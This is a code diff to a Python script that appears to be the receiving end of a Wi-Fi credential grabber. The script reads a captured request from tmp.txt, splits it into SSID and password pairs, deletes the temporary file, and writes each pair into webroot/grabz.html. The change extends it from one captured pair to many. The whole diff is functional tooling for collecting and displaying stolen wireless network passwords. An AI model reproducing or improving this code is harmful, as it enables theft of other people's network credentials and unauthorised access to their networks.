@@ -7,17 +7,32 @@ from os import remove
 def read_data():
     with open("tmp.txt", 'r') as fp:
         data = fp.read()
+    remove("tmp.txt")
     return data
+
+
 # filter and clean data
-def filter_data(data):
+def filter_data(raw_data):
+    coupled_data = list()
     wifi_ssd = ""
     wifi_password = ""
-    data = data.split("?")[1]
-    wifi_ssd, wifi_password = data.split("&")
-    wifi_ssd = wifi_ssd.split("=")[1]
-    wifi_password = wifi_password.split("=")[1]
-    return wifi_ssd, wifi_password
-        
+    raw_data = raw_data.split("?")[1] # remove ?
+    raw_data = raw_data[5:]# remove data=
+    # then for each will be wifi_ssd=$$&wifi_pass=$$&wifi_ssd=$$&wifi_pass=$$
+    i = 0
+    for param in raw_data.split("&"):
+        print(param)
+        # 0, 2 and all pairs are wifi_ssd and impairs are wifi_passwd
+        p = param.split("=")[1]
+        if i % 2 == 0:
+            wifi_ssd = p
+        else:
+            wifi_passwd = p
+            coupled_data.append([wifi_ssd, wifi_passwd])
+        i += 1
+    return coupled_data
+            
+
 # write data to grabz.html
 def write_grab(wifi_ssd, wifi_password):
     curr_time = localtime()
@@ -35,8 +50,12 @@ def write_grab(wifi_ssd, wifi_password):
         new_page = new_page + line + "\n"
     with open("webroot/grabz.html", 'w') as fp:
         fp.write(new_page)
-    remove("tmp.txt")
+
+
 if __name__ == '__main__':
-    data = read_data()
-    wifi_ssd, wifi_password = filter_data(data)
-    write_grab(wifi_ssd, wifi_password)
+    raw_data = read_data()
+    coupled_data = filter_data(raw_data)
+    print(coupled_data)
+    for pair in coupled_data:
+        write_grab(pair[0], pair[1])
+    
